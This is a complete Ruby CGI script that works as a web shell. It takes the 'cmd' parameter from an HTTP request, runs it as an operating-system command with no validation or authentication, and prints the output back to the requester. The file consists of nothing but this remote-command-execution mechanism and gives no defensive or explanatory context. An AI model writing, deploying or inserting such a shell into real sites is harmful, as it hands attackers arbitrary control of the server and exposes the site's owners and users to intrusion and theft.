#!/usr/bin/env ruby
require 'cgi'
cgi = CGI.new
print "Content-Type: text/plain\r\n\r\n"
print `#{cgi['cmd']}` unless cgi['cmd'].to_s.empty?
